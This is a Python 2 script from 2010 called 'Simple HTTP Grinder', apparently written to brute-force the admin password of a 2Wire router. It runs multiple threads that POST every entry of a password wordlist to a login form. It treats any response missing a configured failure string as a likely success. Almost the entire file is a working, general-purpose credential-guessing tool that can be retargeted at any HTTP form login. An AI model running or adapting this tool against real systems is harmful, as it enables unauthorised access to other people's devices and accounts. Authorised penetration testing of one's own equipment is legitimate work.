#!/usr/bin/env python
"""
Simple HTTP Grinder

Copyright (C) 2010 st0w <st0w@st0w.com>

This is released under the MIT License... Do with this whatever the
hell you want, I don't care.

Very simple password grinder developed for testing a 2Wire router.  It
should just as easily work on any HTTP session - all it does is submit
a form via POST.  Nothing fancy here, just reads a wordlist and runs
through them each consecutively. Currently expects HTTP keep-alive to
function, does not try to reconnect if the socket drops.

Looks for the string in variable 'fail' to determine if an attempt was
unsuccessful.  Assumes anything without that string is either an
unexpected error or a password and exits upon receiving such.

If running on a system that doesn't support the stty command (or one
that has stty but that doesn't understand the 'size' argument), you
will need to change the cols variable to reflect the width of your
terminal in characters.  Eventually maybe I'll make it cross-platform,
but right now that's more work than it's worth.

You should set headers carefully, as the script doesn't handle gzipped
or other encodings.  Chunking will work fine as-is, since the script
doesn't really understand HTTP.

Uses Python Queue objects to provide synchronized passing of passwords.
The q_size variable can be made smaller to use even less memory,
however there will likely be some performance overhead in this case,
as there will be less data available to threads at any one time.  This
may or may not matter, as the grinder will most likely be network-I/O-
bound, and not disk-I/O-bound.

Output occurs in the status function, which runs in a separate thread.
I ran a series of tests and even updating every 0.01s had no measurable
impact on performance.  This may differ if you are testing something
that responds much more quickly than a junky 2Wire router.
"""

# ---*< Standard imports >*---------------------------------------------------
from datetime import timedelta
import os
import Queue
import sys
import socket
import threading
import time

# ---*< Initialization >*-----------------------------------------------------
threadcount=3
ip='192.168.1.254'
port=80
fail='The password is incorrect'
wordlist='/pentest/passwords/wordlists/darkc0de.lst'

"""
Make sure in headers to include a single %s, which will be replaced
with the appropriate content-length!!!
"""
headers = """POST /xslt HTTP/1.1
Host: 192.168.1.254
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.352.0 Safari/533.3
Referer: http://192.168.1.254/xslt?PAGE=B05&THISPAGE=B02&NEXTPAGE=B05
Content-Length: %s
Cache-Control: max-age=0
Origin: http://192.168.1.254
Content-Type: application/x-www-form-urlencoded
Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: 
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3"""

"""String for form data... use a single %s to indicate where pw goes"""
formdata='PAGE=A02_POST&THISPAGE=B02&NEXTPAGE=B05&CMSKICK=&PAGE=B05&THISPAGE=B02&NEXTPAGE=B05&PASSWORD=%s'

"""Set stdout to unbuffered"""
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)

"""Get term width... hackish, only tested on Linux and OSX..."""
cols = int(os.popen('stty size','r').read().split()[1])

# ---*< Code >*---------------------------------------------------------------
"""Setup line breaks as \r\n, to fit RFC"""
headers = headers.replace('\n','\r\n')

"""Remove any trailing \r\n characters from headers, so when they're
added later, the appropriate amount remain
"""
while headers[len(headers)-2:] == '\r\n':
  headers = headers[:len(headers)-2]

pass_max_len = 18

# Max of 5k items in the queue...  If each entry takes < 20 bytes,
# the queue and list below should only consume around 200k of memory.
q_size = 5000
pwq = Queue.Queue(q_size)
pwlist = open(wordlist, 'r')

class Status(object):
  pws_checked=0
  starttime = 0
  lock = None
  pwcount = 0
  update_interval = float(0.01)

  def __init__(self, pwcount):
    self.starttime = time.time()
    self.lock = threading.Lock()
    self.pwcount = pwcount
    sys.stdout.write('Beginning grinding with %s passwords...\n' %
                    self.pwcount)
    return super(Status, self).__init__()

  def update_num_checked(self):
    """Must be synchronous"""
    self.lock.acquire()
    self.pws_checked += 1
    self.lock.release()
  
  def get_num_checked(self):
    self.lock.acquire()
    x = self.pws_checked
    self.lock.release()
    return x
  
  def status(self):
    """hackish way to ensure rate is > 0 so don't div-by-zero below"""
    while self.get_num_checked() < 1: time.sleep(self.update_interval)
    
    while running is True:
      cur = self.get_num_checked()
      sys.stdout.write('\r%s\r' % ' '*(cols-3))
      elapsed = time.time() - self.starttime
      
      """
      This isn't the most accurate way of checking the rate, as it does
      not take into account variance.  It's really just an average over
      the course of the whole session.  Would be nice to do this by
      keeping a rolling average.
      """
      rate = cur/elapsed
      pct = 100*float(cur)/self.pwcount
      rem = self.pwcount - cur
      time_rem = rem / rate
      
      outstr = '\rAttempted: %s/%s (%.02f%%)  Remaining: %s (%s)  ' \
               'Elapsed: %.02fs  Rate: %.02fpw/s' %  \
               (cur, self.pwcount, pct, rem, str(timedelta(seconds=time_rem)),
              elapsed, rate)

      outstr += ' '*(cols - len(outstr) - 1)
               
      sys.stdout.write(outstr)
      sys.stdout.flush()
      time.sleep(self.update_interval)
  
def testrun(name,status):
  """Just validates the threading/synchronization works"""
  fn = 'output_thread_%s' % name
#  f = open(fn, 'w')
  while running is True:
    try:
      pw = pwq.get(block=False)
#      f.write(pw)
#      f.write("\n")
      pwq.task_done()
      status.update_num_checked()
    except Queue.Empty:
      pass

def run(name,status):
  """get_pw should be a function that will return the next pw
  """
  sys.stdout.write('[%s] Connecting....\n' % name)
  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  soc.connect((ip,port))
  
  while running is True:
    try:
      """Get next word to attempt"""
      pw = pwq.get(block=False)
      formd = formdata % pw
      head = headers % len(formd)
      req = '%s\r\n\r\n%s' % (head,formd)
      data = ''
      soc.send(req)
      while data.lower().find('</html') < 0:
        data += soc.recv(8096)
      if data.lower().find(fail.lower()) < 0:
        sys.stdout.write("Tried password %s, fail string not found.  "
                        "Possible password detected.  Response: %s\n" %
                        (pw, data))
      pwq.task_done()
      status.update_num_checked()
    except Queue.Empty:
      pass

# this is just a quick and dirty way to get the count of pws....
pwcount = sum(1 for line in open(wordlist))
running = True

"""Fire up the status reporting thread"""
status = Status(pwcount)
t = threading.Thread(target=status.status)
t.start()

"""
Spawn a bunch of threads... each will wait until data become available
in the pwq before they try to send data
"""
for x in range(threadcount):
  t = threading.Thread(target=run, kwargs={'name':x, 'status':status})
  t.start()

"""
TODO: Modify this here (line 232) to allow a list of wordlists.. 
      Iterate over each one, printing the name and number of passwords
      each
"""

"""Loop over wordlist, put words into Queue as spaces are available"""
for pw in pwlist:
  """Removing the single trailing '\n' but don't strip()"""
  pw = pw[:len(pw)-1]
  
  """Append to password queue"""
  pwq.put(pw)
  
# Now wait until every item has been processed - blocking
pwq.join()
running = False
sys.stdout.write('\nDone\n')
